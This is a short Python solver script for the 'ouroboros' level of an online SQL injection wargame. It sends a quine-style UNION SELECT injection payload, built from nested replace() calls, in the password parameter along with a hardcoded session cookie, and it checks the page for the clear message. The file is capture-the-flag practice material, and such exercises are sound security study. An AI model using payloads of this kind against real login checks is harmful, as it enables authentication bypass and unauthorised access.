import requests

url = "https://los.rubiya.kr/chall/ouroboros_e3f483f087c922c84373b49950c212a9.php?"
cookie = {'PHPSESSID':'2l2tjeutp0q371uvicd2a3mtrc'}

def solve():
    query = "pw=a' union select replace(replace('a\" union select replace(replace(\"$\",char(34),char(39)),char(36),\"$\") as pw%23',char(34),char(39)),char(36),'a\" union select replace(replace(\"$\",char(34),char(39)),char(36),\"$\") as pw%23') as pw%23"
    print(query)
    res = requests.get(url=url+query,cookies=cookie)
    if "OUROBOROS Clear!" in res.text:
        print("OUROBOROS Clear!")

if __name__ == "__main__":
    solve()
